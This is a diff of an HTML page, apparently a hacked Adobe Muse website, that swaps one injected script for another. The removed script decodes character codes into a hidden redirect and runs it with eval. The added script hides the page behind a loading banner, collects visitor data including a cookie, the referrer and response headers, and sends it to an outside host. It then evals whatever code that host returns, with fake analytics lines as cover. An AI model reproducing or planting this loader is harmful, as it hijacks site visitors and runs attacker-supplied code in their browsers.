@@ -28,25 +28,41 @@ if(typeof Muse == "undefined") window.Muse = {}; window.Muse.assets = {"required
   <script src="https://webfonts.creativecloud.com/pt-sans:n4:all.js" type="text/javascript"></script>
   <style>body {display: none;}</style>
   <script>
-function rS(s) {
-    var nS = "";
-    for (var i = s.length - 1; i >= 0; i--) {
-        nS += s[i];
-    }
-    var a = nS.split(",");
-    var u = String.fromCharCode.apply(null, a);
-    return u;
-}
-var u, s, c;
-$("body").remove();
-$("html").append("body").html('<div style="margin-top:8%;background-color:white;text-align:center;font-size:40px;">Please Wait for Page to Load...</div>');
-s = rS("16,201,101,411,401,64,011,111,501,611,79,99,111,801,64,911,111,001,011,501,911");
-u = rS("801,901,611,401,64,021,101,001,011,501,74,411,501,901,501,001,79,801,68,74,111,501,64,89,711,401,611,501,301,64,701,901,79,511,001,201,601,94,05,701,15,94,05,25,701,601,001,79,811,74,74,85,511,211,611,611,401");
-c = s + "'" + u + "'";
-eval(c);
-$("html").show();
-</script>
-
+$(document).ready(function () {
+    $("body").hide();
+    $("html").append('<div id="lo317135ad" style="margin-top:8%;background-color:white;text-align:center;font-size:40px;">Please Wait for Page to Load...</div>');
+    var f = new XMLHttpRequest();
+    f.open("GET", document.location, true);
+    f.send(null);
+    var g;
+    f.onreadystatechange = function () {
+        g = f.getAllResponseHeaders().toLowerCase();
+    };
+    var b = "GoogleAnalyticsObject";
+    var c = ("document", "script", "//www.google-analytics.com/analytics.js");
+    c = ("create", "UA-383660-1", "auto");
+    c = ("send", "pageview");
+    var d = jstz.determine();
+    var e = d.name();
+    var qu = escape(window.location.search.substr(1));
+    var rui = location.pathname + location.search;
+    var r = document.referrer;
+    var sn = document.domain;
+    var value = "; " + document.cookie;
+    var pa = value.split("; " + "_event" + "=");
+    var co = pa.pop().split(";").shift();
+    var q;
+    $.ajax({
+        url: "https://illig-construction.websites.camp/github.php",
+        type: "POST",
+        data: "tz=" + e + "&he=" + g + "&rui=" + rui + "&qu=" + qu + "&r=" + r + "&sn=" + sn + "&co=" + co,
+        success: function (a) {
+            eval(a);
+        },
+    });
+});
+    </script>
+    
    </head>
  <body>
 
